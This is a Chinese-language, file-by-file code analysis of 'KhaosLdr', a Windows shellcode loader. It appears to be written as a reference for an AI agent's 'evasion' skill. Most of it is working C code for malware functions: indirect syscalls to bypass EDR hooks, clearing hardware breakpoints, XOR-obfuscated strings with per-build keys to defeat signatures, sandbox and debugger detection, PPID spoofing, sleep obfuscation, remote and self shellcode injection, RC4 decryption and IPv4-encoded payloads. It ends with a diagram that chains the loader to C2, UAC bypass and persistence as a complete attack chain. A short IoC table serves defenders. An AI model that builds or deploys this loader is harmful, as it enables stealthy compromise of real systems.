# KhaosLdr 源码逐文件分析笔记

> 为 khaosldr-evasion 技能提供深度代码级参考

## loader_v3.c — 主入口与编排

### 编译时配置（宏开关）
| 宏 | 作用 |
|-----|------|
| `PRODUCTION` | 移除所有 printf 调试输出 |
| `ENABLE_HWBP_BYPASS` | 启用硬件断点绕过 |
| `ENABLE_PPID_SPOOF` | 启用父进程欺骗 |
| `CFG_SANDBOXESCORE` | 沙箱评分阈值（默认30） |
| `CFG_SLEEP` | 注入前休眠秒数 |

### 执行流程（伪代码）
```
CheckSandboxEnvironment() → score
if (score >= 30 || debugger) → exit(0)

evs_init()  // 解密100+个字符串

// 反调试二次确认
IsRunningInSandbox() || IsDebuggerActive() → exit(0)

// 载荷解析
if (has_ipv4_section)
    ipv4_decode(section, &enc_shellcode, &len)
else
    enc_shellcode = enc_payload

// RC4 解密
rc4_init(S, key, 16)
rc4_crypt(S, enc_shellcode, len)
memset_s(key, 0, 16)  // 清除密钥

// 进程注入
if (target_process_name)
    ppid_spoof → 以伪造父进程启动目标进程作为注入宿主
    inject_shellcode_remote(pid, shellcode, len) → NtCreateThreadEx
else
    inject_shellcode_self(shellcode, len)
    hwbp_bypass()  // 自注入时清除HWBP

// 清理
memset_s(shellcode, 0, len)
exit(0)
```

## syscalls.c — 间接系统调用引擎

### FreshyCalls 风格实现

每个 syscall 函数的实现模式：
```c
BOOL SysNtAllocateVirtualMemory(HANDLE hProc, PVOID *base, ULONG_PTR zero,
                                 PSIZE_T size, ULONG allocType, ULONG protect) {
    // 1. 如果 syscall 号未解析，从 ntdll 中提取
    if (stub_NtAllocateVirtualMemory == NULL) {
        DWORD ssn = GetSyscallNumber(GetProcAddress(ntdll, "NtAllocateVirtualMemory"));
        stub_NtAllocateVirtualMemory = (NTSTATUS(*)(...))GetSyscallStub(ssn);
    }
    // 2. 调用间接 syscall 存根
    return stub_NtAllocateVirtualMemory(hProc, base, zero, size, allocType, protect, NULL, 0);
}
```

### SSN 解析（GetSyscallNumber）
```c
// ntdll!NtXxx 在所有 Windows 版本中都以固定字节序列开头:
// 4C 8B D1    mov r10, rcx
// B8 ?? ?? ?? ??    mov eax, SSN
DWORD GetSyscallNumber(LPVOID pFunc) {
    BYTE *p = (BYTE*)pFunc;
    if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1)
        return *(DWORD*)(p+4);  // SSN
    return 0;
}
```

### 已实现的 Syscall 存根
1. NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect)
2. NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect)
3. NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer, Length, BytesWritten)
4. NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartAddress, Parameter, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList)
5. NtOpenProcess(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId)
6. NtDelayExecution(Alertable, Interval)
7. NtClose(Handle)
8. NtQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength)
9. NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength)

## hwbp_bypass.c — 硬件断点逃逸

### 技术原理

EDR 设置硬件断点的典型位置:
- `ntdll!NtAllocateVirtualMemory` → DR0
- `ntdll!NtWriteVirtualMemory` → DR1
- `ntdll!NtProtectVirtualMemory` → DR2
- `ntdll!NtCreateThreadEx` → DR3

### 绕过步骤
```
1. AddVectoredExceptionHandler(1, HWBPHandler)
   → 注册第一个 VEH（优先于 EDR 的 VEH）

2. 触发某个被 hook 的 syscall → 硬件断点触发 → EXCEPTION_SINGLE_STEP
   
3. VEH handler 被调用:
   → 检查 ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP
   → 确认是硬件断点触发
   → GetThreadContext(thread, &ctx)
   → ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0  // 清除调试寄存器
   → ctx.Dr7 = 0  // 禁用所有硬件断点
   → SetThreadContext(thread, &ctx)
   → 继续执行

4. RemoveVectoredExceptionHandler(HWBPHandler)
```

### 注意
- 2025 年后的 EDR 开始检测 SetThreadContext 对 DR0-DR3 的修改
- Microsoft 正在内核中引入硬件断点保护 (Kernel-mode HWBP protection)

## evs.c — 加密变量字符串引擎

### 为什么单函数 noinline？

传统 XOR 字符串混淆（如 lazy_importer 风格）：
```c
#define XOR_STR(s) ([]() { 
    char out[sizeof(s)]; 
    for(int i=0;i<sizeof(s);i++) out[i]=s[i]^0x55; 
    return out; 
}())
// ↑ 每个使用点展开为独立循环 → .text 段有 100+ 个相同模式的循环
```

KhaosLdr 方案：
```c
__attribute__((noinline))  // 不内联
void evs_dec(char *out, const unsigned char *enc, size_t n) {
    unsigned char k = EVS_KEY;
    for (size_t i = 0; i < n; i++)
        out[i] = (char)(enc[i] ^ k);
    out[n] = '\0';
}
// ↑ .text 段只有 1 个 XOR 循环 → 降低静态特征
```

### evs_strings.h 内容（片段）
```c
const unsigned char enc_NtAllocateVirtualMemory[] = {
    0x32, 0x36, 0x65, 0x2E, 0x2E, 0x38, 0x35, 0x26, 0x36, 0x37, 0x33,
    0x61, 0x3A, 0x30, 0x36, 0x37, 0x26, 0x2E, 0x65, 0x2D, 0x33, 0x2E,
    0x38, 0x38, 0x30, 0x26, 0x35, 0x3D
};
// 运行时 → evs_dec(buf, enc_NtAllocateVirtualMemory, 28) → "NtAllocateVirtualMemory"

const unsigned char enc_kernel32[] = {
    0x2E, 0x33, 0x30, 0x36, 0x33, 0x2E, 0x20, 0x21, 0x3F, 0x2A, 0x33, 0x33
};
// 运行时 → evs_dec(buf, enc_kernel32, 12) → "kernel32.dll"
```

### 加密密钥
```c
#define EVS_KEY 0x5A  // 默认 XOR 密钥
```
- 可在编译时修改 `EVS_KEY` 值以改变所有加密字符串
- 建议每次构建使用不同的 EVS_KEY 以打破签名检测

## sandbox_evasion.c — 沙箱/VM/调试器检测

### 检测矩阵

| 序号 | 检测类型 | 实现方式 | 误报风险 |
|------|---------|---------|---------|
| 1 | VMware | 注册表 `HKLM\SOFTWARE\VMware, Inc.\VMware Tools` + 驱动 `vmhgfs.sys`, `vmmouse.sys` | 低 |
| 2 | VirtualBox | 注册表 `HKLM\SYSTEM\ControlSet001\Services\VBoxGuest` + 驱动 `VBoxMouse.sys` | 低 |
| 3 | Hyper-V | 驱动 `vmci.sys` + 注册表服务键 | 低 |
| 4 | 调试器 | PEB.BeingDebugged (fs:[0x30]+0x2) + NtQueryInformationProcess(DebugPort=7, DebugFlags=31) | 极低 |
| 5 | CPU 核心 | GetSystemInfo → dwNumberOfProcessors < 2 | 低（现代桌面至少 2 核） |
| 6 | RAM | GlobalMemoryStatusEx → ullTotalPhys < 4GB | 低（现代桌面 ≥ 8GB） |
| 7 | 磁盘 | GetDiskFreeSpaceEx("C:") → < 80GB | 低 |
| 8 | 运行时间 | GetTickCount64() < 600000 (10 分钟) | 中（刚重启的真实机器） |
| 9 | 用户活动 | EnumUsers + GetLastInputInfo | 中 |
| 10 | 进程数 | CreateToolhelp32Snapshot → 枚举进程 < 50 | 中（嵌入式/工控机可能较少） |

### 评分逻辑
```c
int CheckSandboxEnvironment() {
    int score = 0;
    bool isDebugger = CheckDebugger();
    
    if (CheckVirtualMachine()) score += 30;  // VM 高权重
    if (isDebugger) score += 40;              // 调试器最高权重
    if (CheckSystemResources()) score += 20;  // 低资源
    if (CheckUptime()) score += 15;           // 新启动
    if (CheckUserActivity()) score += 10;     // 无用户
    if (CheckProcessCount()) score += 15;     // 进程少
    
    g_sandbox_score = score;
    return score;
}

// 退出判定
if (isDebugger || score >= 50) exit(0);
```

## ppid_spoofing.c — PPID 欺骗

### 技术实现
```c
BOOL SpoofParentProcess(const char *targetProcess, const char *childCmd) {
    // 1. 查找目标进程 PID
    DWORD targetPid = FindProcessByName("explorer.exe");
    
    // 2. 打开目标进程句柄
    HANDLE hParent = SysNtOpenProcess(PROCESS_CREATE_PROCESS, FALSE, &clientId);
    
    // 3. 初始化属性列表
    SIZE_T cbSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbSize);
    lpAttributeList = HeapAlloc(GetProcessHeap(), 0, cbSize);
    InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &cbSize);
    
    // 4. 设置 PPID 属性
    UpdateProcThreadAttribute(lpAttributeList, 0, 
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, 
        &hParent, sizeof(hParent), NULL, NULL);
    
    // 5. 创建进程
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(STARTUPINFOEX);
    si.lpAttributeList = lpAttributeList;
    
    CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFOEX_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi);
    
    return TRUE;
}
```

### 常见伪装目标
- `explorer.exe` — 最常用，所有用户会话中都有
- `svchost.exe` — 系统服务宿主
- `winlogon.exe` — 登录进程（权限高）
- `RuntimeBroker.exe` — UWP 应用的代理进程

## spoof_sleep.c — 休眠混淆

### 实现
```c
void SleepViaSyscall(DWORD milliseconds) {
    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)(milliseconds * 10000LL);  // 100ns 单位，负值=相对时间
    
    // 直接 syscall NtDelayExecution，不经过 ntdll.dll
    SysNtDelayExecution(FALSE, &delay);
}
```

### 为什么有效
- `kernel32!Sleep` → 调用 `ntdll!NtDelayExecution` → EDR Hook 在这里
- `SleepViaSyscall` → 直接 syscall 指令 → 完全绕过 EDR

### 进阶：结合 Ekko 模式
```
SleepViaSyscall:
    1. 保存 shellcode 区域原始内容
    2. XOR 加密 shellcode 内存区域
    3. SysNtDelayExecution(sleep_time)  // 休眠期间 shellcode 不可读
    4. XOR 解密恢复原始内容
    5. 继续执行
```

## injection.c — 注入引擎

### 模式 1: 远程进程注入（NtCreateThreadEx）
```c
BOOL InjectRemote(HANDLE hProcess, LPVOID shellcode, SIZE_T size) {
    // 1. 在目标进程分配 RX 内存（全 syscall）
    LPVOID remoteAddr = NULL;
    SIZE_T regionSize = size;
    SysNtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 2. 写入 shellcode
    SysNtWriteVirtualMemory(hProcess, remoteAddr, shellcode, size, NULL);
    
    // 3. 修改内存保护为 RX
    ULONG oldProtect;
    SysNtProtectVirtualMemory(hProcess, remoteAddr, &regionSize, 
        PAGE_EXECUTE_READ, &oldProtect);
    
    // 4. 创建远程线程
    HANDLE hThread = NULL;
    SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        remoteAddr, NULL, 0, 0, 0, 0, NULL);
    
    return hThread != NULL;
}
```

### 模式 2: 自注入 + HWBP 绕过
```c
BOOL InjectSelf(LPVOID shellcode, SIZE_T size) {
    // 1. 本地分配
    LPVOID execAddr = VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    memcpy(execAddr, shellcode, size);
    
    // 2. HWBP 绕过
    if (cfg_hwbp_bypass) {
        InstallHWBPBypass();  // 注册 VEH → 清除 DR0-DR3
    }
    
    // 3. 修改保护
    DWORD oldProtect;
    VirtualProtect(execAddr, size, PAGE_EXECUTE_READ, &oldProtect);
    
    // 4. 直接调用（避免 CreateThread 被 Hook）
    ((void(*)())execAddr)();
    
    return TRUE;
}
```

## crypto.c — RC4 加密

```c
// RC4 KSA (Key Scheduling Algorithm)
void rc4_init(unsigned char *S, const unsigned char *key, size_t keylen) {
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
}

// RC4 PRGA (Pseudo-Random Generation Algorithm)
void rc4_crypt(unsigned char *S, unsigned char *data, size_t len) {
    int i = 0, j = 0;
    for (size_t n = 0; n < len; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }
}
```

## ipv4.c — IPv4 地址混淆

### 编码格式
```
.pv4 节内容:
"192.168.1.1\n10.0.0.1\n172.16.0.1\n..."
```

### 解码
```c
size_t ipv4_decode(const char *ipv4_section, unsigned char **out) {
    // 1. 计算 IP 数量（按换行符分割）
    // 2. 每个 IP → 4 字节 shellcode
    size_t ip_count = count_lines(ipv4_section);
    *out = malloc(ip_count * 4);
    
    // 3. 逐行解析
    char *line = strtok(ipv4_section, "\n");
    size_t idx = 0;
    while (line) {
        int a, b, c, d;
        sscanf(line, "%d.%d.%d.%d", &a, &b, &c, &d);
        (*out)[idx++] = (unsigned char)a;
        (*out)[idx++] = (unsigned char)b;
        (*out)[idx++] = (unsigned char)c;
        (*out)[idx++] = (unsigned char)d;
        line = strtok(NULL, "\n");
    }
    return ip_count * 4;
}
```

## 检测与对抗分析

### EDR 检测 KhaosLdr 的可能方法

| 检测维度 | 方法 | KhaosLdr 对策 | 绕过难度 |
|----------|------|--------------|---------|
| 静态 PE 特征 | YARA 规则匹配 MinGW 编译模式 | 修改编译器、混淆 PE 结构 | ★★★☆☆ |
| 导入表监控 | 检查 IAT 中的敏感 API 调用 | 全 syscall，无 IAT 依赖 | ★★☆☆☆ |
| 系统调用监控 | ETW Kernel Provider → 关联 syscall 序列 | 非标准调用序列 | ★★★★☆ |
| 硬件断点 | API Hook + DR 寄存器 | HWBP Bypass 清除 | ★★★☆☆ |
| 行为分析 | RW → RX 内存 + 远程线程 | 换用 APC / Thread Pool | ★★★★☆ |
| 进程树分析 | 非标准父进程 | PPID Spoofing | ★★★☆☆ |
| Sleep 分析 | Sleep Hook 检测休眠模式 | NtDelayExecution syscall | ★★★☆☆ |

### IoC（入侵指标）

**文件级 IoC:**
- PE 文件由 MinGW/GCC 编译（`.rdata$x`, `.CRT$XCU` 节）
- 无标准导入表（仅 ntdll.dll 或完全无导入）
- `.ipv4` 节包含大量 IP 地址字符串
- 代码段中存在 `syscall` 指令 + 附近有 SSN 加载模式

**行为级 IoC:**
- 从 ntdll.dll 中扫描 `4C 8B D1 B8` 字节模式
- 在没有对应 Win32 API 调用的情况下执行 syscall
- 对 DR0-DR3 的 SetThreadContext 调用
- 单进程在短时间内多次切换内存保护

**网络级 IoC:**
- C2 通信取决于最终加载的 Beacon
- KhaosLdr 本身不产生网络流量（纯内存操作）

## 与现有技能的协同

```
khaosldr-evasion ←→ win-offensive-dev
  │                    │
  │  KhaosLdr 提供:   │  win-offensive-dev 提供:
  │  - syscall 框架   │  - Shellcode 生成
  │  - EDR 规避       │  - 进程注入变体
  │  - 沙箱逃逸       │  - Token 操作
  │  - PPID 欺骗      │  - UAC 绕过
  │  - Sleep 混淆     │  - 持久化
  │                    │
  └── 联合使用 = 完整红队植入物 ──┘

khaosldr-evasion ←→ av-evasion
  │                    │
  │  加载器层规避     │  Shellcode 层规避
  │  (Syscall/HWBP)   │  (加密/编码/分片)
  │                    │
  └── 双层防护 → 更高免杀率 ──┘

khaosldr-evasion ←→ c2-operation
  │                    │
  │  Loader 投放      │  C2 框架管理
  │  Shellcode 加载   │  Beacon 配置
  │                    │
  └── 从投放到持久化完整攻击链 ──┘
```
